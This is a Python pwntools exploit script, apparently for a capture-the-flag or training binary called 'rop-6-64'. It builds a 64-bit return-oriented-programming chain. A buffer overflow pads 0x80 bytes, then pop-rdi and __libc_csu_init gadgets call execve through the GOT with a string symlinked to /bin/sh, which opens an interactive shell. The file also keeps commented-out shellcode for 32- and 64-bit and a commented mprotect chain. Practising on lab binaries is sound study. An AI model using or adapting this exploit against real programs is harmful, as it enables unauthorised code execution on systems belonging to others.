#!/usr/bin/env python

from pwn import *
import os

p = process('./rop-6-64')

#shellcode = 'jlX\x0f\x05H\x89\xc6H\x89\xc7jrX\x0f\x05H1\xf6H1\xd2j;XH\xbb//bin/shVSH\x89\xe7\x0f\x05'
#32 bit: 'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xdb1\xc91\xd2j\x0bXShn/shh//bi\x89\xe3\xcd\x80'

#while (len(shellcode)) < 0x88:
#        shellcode += "\x90"

buf = "A" * 0x80 + "BBBBBBBB"



"""
0x00000000004006e0 <+64>:    mov    %r13,%rdx
0x00000000004006e3 <+67>:    mov    %r14,%rsi
0x00000000004006e6 <+70>:    mov    %r15d,%edi
0x00000000004006e9 <+73>:    callq  *(%r12,%rbx,8)
0x00000000004006ed <+77>:    add    $0x1,%rbx
0x00000000004006f1 <+81>:    cmp    %rbp,%rbx
0x00000000004006f4 <+84>:    jne    0x4006e0 <__libc_csu_init+64>
0x00000000004006f6 <+86>:    add    $0x8,%rsp
0x00000000004006fa <+90>:    pop    %rbx
0x00000000004006fb <+91>:    pop    %rbp
0x00000000004006fc <+92>:    pop    %r12
0x00000000004006fe <+94>:    pop    %r13
0x0000000000400700 <+96>:    pop    %r14
0x0000000000400702 <+98>:    pop    %r15
0x0000000000400704 <+100>:   retq
"""


"""
0x0000000000400703 : pop rdi ; ret
"""
pop_rdi_ret = p64(0x400703)

"""
0x601030 execve_got
"""
execve_got = p64(0x601030)
"""
0x400824 string "d"
"""
string = p64(0x400824)

#if os.path.exists("d"):
#    os.unlink("d")
#os.symlink("/bin/sh", "d")

buf += pop_rdi_ret
buf += string

buf += p64(0x4006fa)

buf += p64(0) #rbx = 0
buf += p64(0) #rbp = 0 doesn't matter
buf += execve_got #r12 = execve_got
buf += p64(0) #r13 = 0
buf += p64(0) #r14 = 0
buf += string #r15 = string
buf += p64(0x4006e0) #ret to 0x4006e0

"""
pop_rdi = p64(0x400743)
pop_rsi_pop_ret = p64(0x400741)
pop_rdx_pop_ret = p64(0x40064a)

g_buf_addr = p64(0x601080)
g_buf_aligned = p64(0x601000)

buf += pop_rdi
buf += g_buf_aligned
buf += pop_rsi_pop_ret
buf += p64(0x1000)
buf += p64(0x1000)
buf += pop_rdx_pop_ret
buf += p64(7)
buf += p64(7)
buf += mprotect
buf += g_buf_addr
"""
with open("e.txt", "w") as f:
    f.write(buf)
    f.close

p.sendline(buf)
p.interactive()
